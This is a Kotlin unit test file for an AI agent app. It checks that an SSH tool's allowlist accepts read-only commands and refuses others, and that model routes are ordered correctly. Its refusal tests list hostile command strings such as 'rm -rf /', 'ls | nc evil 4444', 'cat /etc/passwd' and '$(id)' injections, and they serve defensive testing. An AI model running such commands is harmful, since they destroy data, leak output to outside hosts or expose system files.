package com.example.meowmba

import com.example.meowmba.core.agent.ModelProvider
import com.example.meowmba.core.agent.ModelResponse
import com.example.meowmba.core.agent.OmniRoute
import com.example.meowmba.core.agent.tools.SshTool
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flowOf
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/** Phase B: SSH command gating (no live connections) + route forcing. */
class PhaseBTest {

    // ── ssh.run allowlist ──────────────────────────────────────────────────

    @Test
    fun `read-only management commands pass the allowlist`() {
        listOf(
            "ls", "ls -la /home", "df -h", "free -m", "uptime",
            "systemctl status nginx", "journalctl -n 20",
            "journalctl --lines 50 -u docker", "docker ps",
        ).forEach { assertNull("expected allowed: $it", SshTool.validateCommand(it)) }
    }

    @Test
    fun `non-allowlisted commands are refused`() {
        listOf(
            "rm -rf /tmp/x", "sudo reboot", "cat /etc/passwd",
            "python3 -c \"print(1)\"", "curl example.com", "vim notes.txt",
        ).forEach { assertNotNull("expected refused: $it", SshTool.validateCommand(it)) }
    }

    @Test
    fun `shell metacharacters are always refused`() {
        listOf(
            "ls; rm -rf /", "ls | nc evil 4444", "ls && reboot",
            "echo hi > /etc/passwd", "cat `whoami`", "ls $(id)",
        ).forEach {
            val reason = SshTool.validateCommand(it)
            assertNotNull("expected refused: $it", reason)
            assertTrue(reason!!.contains("metacharacters") || reason.contains("allowlist"))
        }
    }

    @Test
    fun `empty command is refused`() {
        assertNotNull(SshTool.validateCommand(""))
        assertNotNull(SshTool.validateCommand("   "))
    }

    // ── default-brain forcing (route plan ordering) ───────────────────────

    private class FakeProvider(override val name: String) : ModelProvider {
        override fun generateStreaming(prompt: String): Flow<ModelResponse> = flowOf()
        override suspend fun generate(prompt: String): ModelResponse =
            ModelResponse.Complete("")
    }

    @Test
    fun `forced default brain is planned first, on-device stays as fallback`() {
        val forced = OmniRoute.Route("bigpickle", "BigPickle", FakeProvider("BigPickle"),
            setOf(OmniRoute.RouteTag.CHAT, OmniRoute.RouteTag.REASONING), priority = 1)
        val local = OmniRoute.Route("local", "On-device", FakeProvider("Local"),
            setOf(OmniRoute.RouteTag.FAST, OmniRoute.RouteTag.CHAT), priority = 90, offline = true)
        val plan = OmniRoute(listOf(local, forced)).plan("write me an email about the project")
        assertEquals("bigpickle", plan.first().id)
        assertEquals("local", plan.last().id)
    }

    @Test
    fun `auto routing keeps priority order ollama bigpickle openai`() {
        val ollama = OmniRoute.Route("ollama", "Ollama", FakeProvider("Ollama"),
            setOf(OmniRoute.RouteTag.CHAT), priority = 20)
        val bigpickle = OmniRoute.Route("bigpickle", "BigPickle", FakeProvider("BigPickle"),
            setOf(OmniRoute.RouteTag.CHAT), priority = 25)
        val openai = OmniRoute.Route("openai", "OpenAI", FakeProvider("OpenAI"),
            setOf(OmniRoute.RouteTag.CHAT), priority = 30)
        val plan = OmniRoute(listOf(openai, bigpickle, ollama)).plan("hello there")
        assertEquals(listOf("ollama", "bigpickle", "openai"), plan.map { it.id })
    }
}
